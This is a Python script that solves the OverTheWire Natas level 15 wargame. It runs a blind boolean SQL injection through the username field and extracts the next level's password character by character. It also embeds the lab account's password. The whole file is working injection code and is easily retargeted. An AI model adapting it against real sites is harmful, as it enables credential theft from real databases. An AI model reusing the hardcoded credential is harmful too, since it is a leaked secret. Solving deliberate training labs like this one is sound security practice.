#!/usr/local/bin/python3

import requests

if __name__ == "__main__":

    password = ""
    length = 32
    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

    while length > 0:
        print(password)
        for i in charset:
            temp_string = "natas16\" AND BINARY password LIKE \"" + password + i + "%"
            r = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", data={'username':temp_string}, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
            if "This user exists." in r.text:
                password += i
                length -= 1
                break
           
    print (password)
    


